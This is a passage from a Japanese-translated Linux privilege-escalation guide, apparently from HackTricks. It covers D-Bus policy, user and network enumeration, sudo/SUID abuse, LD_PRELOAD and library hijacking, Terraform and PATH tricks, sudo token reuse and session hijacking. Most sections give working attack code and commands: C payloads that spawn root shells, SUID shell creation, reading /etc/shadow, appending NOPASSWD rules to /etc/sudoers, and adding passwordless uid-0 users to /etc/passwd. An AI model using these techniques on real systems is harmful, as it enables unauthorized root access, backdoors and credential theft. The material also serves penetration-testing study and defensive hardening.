D-Busは**許可/拒否モデル**で動作し、マッチするポリシールールの累積効果に基づいてメッセージ権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのインタラクションを指定し、これらの権限を悪用することでprivilege escalationを引き起こす可能性があります。

そのようなポリシーの例として、`/etc/dbus-1/system.d/wpa_supplicant.conf`にあるポリシーが示されており、rootユーザーが`fi.w1.wpa_supplicant1`を所有し、それへの送信および受信を行う権限が記載されています。

ユーザーやグループが指定されていないポリシーは全体に適用され、"default"コンテキストのポリシーは他の特定のポリシーでカバーされない全てに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信の enumerate と exploit の方法を学べます：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、マシンの位置を把握するのは常に興味深いです。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセスする前に相互作用できなかったマシン上で動作しているネットワークサービスは常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic が可能か確認してください。可能であれば、いくつかの credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が誰（**who**）か、どのような**privileges**を持っているか、どの**users**がシステムに存在するか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが escalate privileges できるバグの影響を受けました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh), [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root privileges を付与する可能性のあるグループの**メンバー**であるかどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボードの中に興味深いものが含まれていないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境のパスワードを1つでも知っている場合は、そのパスワードを使って各ユーザーにログインしてみてください。

### Su Brute

多くのノイズが出ることを気にしない場合で、対象のマシンに `su` と `timeout` バイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーを brute-force しようとします。

## Writable PATH abuses

### $PATH

$PATH のいずれかのフォルダに書き込みできることが判明した場合、書き込み可能なフォルダ内に、別のユーザー（理想は root）が実行するコマンド名と同じ名前の backdoor を作成することで権限昇格できる可能性があります。ただし、そのコマンドが $PATH 上であなたの書き込み可能フォルダより前にあるフォルダから読み込まれないことが条件です。

### SUDO and SUID

sudo を使って実行できるコマンドが許可されている場合や、バイナリに suid ビットが設定されている場合があります。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しない commands はファイルの読み取りおよび/または書き込み、あるいは command の実行さえ可能にします。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー`demo`が`root`として`vim`を実行できます。root directoryにssh keyを追加するか、`sh`を呼び出すことでshellを取得するのは簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際にユーザーが**環境変数を設定できる**ようにします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer を基にした**もので、スクリプトを root として実行する際に任意の python ライブラリを読み込める **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持されると → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドを呼び出したときに Bash の非対話的な起動挙動を利用して任意のコードを root として実行できます。

- なぜ機能するか: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source（読み込み）します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo が `BASH_ENV` を保持している場合、あなたのファイルは root 権限で source されます。

- 要件:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
- Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
- Consider sudo I/O logging and alerting when preserved env vars are used.

### Terraform via sudo with preserved HOME (!env_reset)

If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.

- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.

### TF_VAR overrides + symlink validation bypass

Terraformの変数は`TF_VAR_<name>`環境変数で渡すことができ、sudoが環境を保持する場合にはそのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`のような弱い検証はシンボリックリンクでバイパスできます：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform はシンボリックリンクを解決し、実際の `/root/root.txt` を攻撃者が読める先にコピーします。同じ手法は、宛先シンボリックリンクを事前に作成することで特権パスへの**書き込み**にも利用できます（例: プロバイダの宛先パスを `/etc/cron.d/` 内に向けるなど）。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudo は `requiretty` で設定でき、これは sudo を対話的な TTY からのみ実行するように強制します。`!requiretty` が設定されている（またはオプションが存在しない）場合、sudo は reverse shells、cron jobs、または scripts のような非対話的コンテキストから実行できます。
```bash
Defaults !requiretty
```
これは単独では直接的な脆弱性ではありませんが、sudo ルールがフル PTY を必要とせずに悪用されうる状況を拡大します。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- 要件: スクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）で、絶対パスを使わずにコマンド（`free`, `df`, `ps` など）を呼び出し、かつ最初に検索される書き込み可能な PATH エントリが存在すること。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** で他のファイルを読むか、**symlinks** を使います。例えば sudoers file では: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使用されている (\*), さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary にコマンドのパスが指定されていない場合

単一のコマンドに対して **sudo 権限** が **パスを指定せずに** 与えられている場合（例: _hacker10 ALL= (root) less_）、PATH 変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する（奇妙な SUID バイナリの内容は必ず** _**strings**_ **で確認してください）**場合にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary でコマンドのパスが指定されている場合

もし**suid** バイナリが**パスを指定して別のコマンドを実行している**場合、suidファイルが呼び出すコマンド名で**export a function**を作成してエクスポートしてみてください。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してエクスポートしてみてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid バイナリを呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダーが他のすべてのライブラリ（標準 C ライブラリ (`libc.so`) を含む）より前に読み込む、1つまたは複数の共有ライブラリ（.so ファイル）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

しかし、システムのセキュリティを維持し、この機能が特に **suid/sgid** 実行ファイルで悪用されるのを防ぐために、システムはいくつかの条件を適用します:

- ローダーは、real user ID (_ruid_) が effective user ID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- **suid/sgid** を持つ実行ファイルに対しては、標準パスにあり、かつ suid/sgid になっているライブラリのみがプリロードされます。

権限昇格は、`sudo` でコマンドを実行する権限があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生することがあります。この設定により、`sudo` でコマンドが実行されても **LD_PRELOAD** 環境変数が維持されて認識されるため、昇格した権限で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
ファイル名を **/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**それをコンパイルする**には、次を使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合、同様の privesc が悪用され得ます。なぜなら、ライブラリが検索されるパスを攻撃者が制御できるからです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

異常に見える**SUID**権限を持つバイナリに遭遇したら、**.so**ファイルを適切に読み込んでいるか確認するのが良い習慣です。以下のコマンドで確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_に遭遇した場合、これは悪用の可能性を示唆します。

これを悪用するには、次のコードを含むCファイル、例えば_"/path/to/.config/libcalc.c"_を作成します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して権限を昇格させ、昇格した権限でシェルを実行することを目的としています。

上記の C file を shared object (.so) ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムの侵害が発生する可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダから library を読み込む SUID binary を見つけたので、そのフォルダに必要な名前の library を作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリは `a_function_name` という名前の関数を持っている必要があります。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリを精選したリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに対して**引数のみを注入できる**ケースを対象としています。

このプロジェクトは、制限されたシェルからの脱出、特権昇格や維持、ファイル転送、bind および reverse シェルの生成、そしてその他の post-exploitation tasks を支援するために悪用できる Unix バイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo のルールを悪用できる方法を見つけられるかどうかを確認できます。

### Sudo トークンの再利用

パスワードは知らないが **sudo access** がある場合、**sudo コマンドの実行を待ってセッショントークンをハイジャックする**ことで特権を昇格させることができます。

特権昇格の要件:

- あなたは既にユーザー "_sampleuser_" としてシェルを持っています
- "_sampleuser_" が **`sudo` を使用して** 過去**15分以内**に何かを実行している（デフォルトでは、それがパスワードを入力せずに `sudo` を使用できる sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` にアクセスできること（アップロード可能であること）

（`ptrace_scope` を一時的に有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に修正して `kernel.yama.ptrace_scope = 0` を設定します）

これらの要件がすべて満たされている場合、**次のツールを使って特権を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の**exploit**（`exploit.sh`）はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って**セッション内の sudo トークンを有効化**できます（自動的に root シェルは得られないので、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root 所有で setuid を持つ** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- The **third exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダまたはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーと PID のための sudo token を作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても**sudo privileges**を取得できます。次のように:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
`/etc/sudoers` と `/etc/sudoers.d` 内のファイルは誰が `sudo` を使えるかとその方法を設定します。これらのファイルは **デフォルトで user root と group root のみが読み取れます**。\
**もし**このファイルを**読み取れる**なら、**興味深い情報を取得できる可能性があります**。また、任意のファイルに**書き込み**できるなら、**権限昇格**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権限があれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD向けの `doas` などがあります。設定は `/etc/doas.conf` を必ず確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して `sudo` を使用する**ことで権限を昇格しており、かつそのユーザーコンテキスト内でシェルを得ている場合、root としてあなたのコードを実行しその後ユーザーのコマンドを実行するような**新しい sudo 実行ファイルを作成**できます。次に、**ユーザーコンテキストの $PATH を変更**（例えば新しいパスを .bash_profile に追加）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のように実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

The file `/etc/ld.so.conf` indicates **読み込まれる設定ファイルの場所を示します**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **他のディレクトリを指し** where **ライブラリ** are going to be **検索されます**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **このミスコンフィギュレーションをどのように悪用するか** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されたとおり、その場所の lib がプログラムで使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを次のコマンドで作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities は **プロセスに対する利用可能な root 権限のサブセット** を提供します。これは root の **権限をより小さく識別可能な単位に分割** することを効果的に意味します。これらの各単位は個別にプロセスに付与できるため、権限の完全な集合が縮小され、悪用のリスクが低減されます。\
以下のページを読んで、**capabilities とそれらの悪用方法の詳細を学んでください**：

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット** は影響を受けるユーザーが **"cd"** でフォルダに入れることを意味します。\
**"read"** ビットはユーザーが **"list"** によって **"files"** を一覧できることを意味し、**"write"** ビットはユーザーが **"delete"** および **"create"** によって新しい **"files"** を作成・削除できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の第2層を表し、**従来の ugo/rwx 権限をオーバーライドすることが可能**です。これらの権限は、所有者でもグループの一員でもない特定のユーザーに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **粒度により、より正確なアクセス管理が可能** になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**付与する** ユーザー "kali" にファイルの読み取りおよび書き込み権限を:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell セッションを開く

**古いバージョン**では、別のユーザー（**root**）のいくつかの**shell**セッションを**hijack**できることがあります.\  
**最新のバージョン**では、screen セッションには**自分のユーザー**のものにのみ**接続**できます。しかし、**セッション内の興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** の問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian ベースのシステム（Ubuntu, Kubuntu, など）で生成されたすべての SSL および SSH キーは、このバグの影響を受けている可能性があります。\
このバグはこれらの OS で新しい ssh key を作成した際に発生します。なぜなら **可能性はわずか 32,768 通りしかなかった** からです。これはすべての組み合わせを計算できることを意味し、**ssh public key を持っていれば対応する private key を検索できます**。計算済みの組み合わせはここで見つけることができます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されるかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されるかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、サーバが空のパスワード文字列のアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root は password と private key の両方でログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key を使用し、かつ commands options が指定されている場合にのみログインできます
- `no`: 許可しない

### AuthorizedKeysFile

ユーザ認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、ホームディレクトリに置換されます。**絶対パス**（`/` で始まる）または**ユーザのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、もしユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh はあなたのキーのpublic key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（without passphrases!）鍵を残しておく代わりに、**use your local SSH keys instead of leaving keys** ことができます。つまり、ssh で **to a host** に **jump** し、そこから **initial host** にある **key** を使って別のホストに **jump to another** ことが可能になります。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの**オプション**を**上書き**でき、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` で ssh-agent フォワーディングを**許可**または**拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されているのを見つけたら、次のページを読んでください。**それを悪用して権限を昇格できる可能性があります**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザが新しいシェルを実行したときに**実行されるスクリプト**です。したがって、**それらのいずれかに書き込みまたは変更できる場合、権限を昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし不審なプロファイルスクリプトが見つかったら、**機密情報**がないか確認してください。

### Passwd/Shadow ファイル

OSによっては`/etc/passwd`や`/etc/shadow`のファイル名が異なる、またはバックアップが存在する場合があります。したがって、**すべてを見つけ出し**、それらを**読み取れるか確認し**、ファイル内に**ハッシュが含まれているか**を調べることを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを設定してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで`su`コマンドを`hacker:hacker`で使用できます。

あるいは、以下の行を使ってパスワードなしのダミーのユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
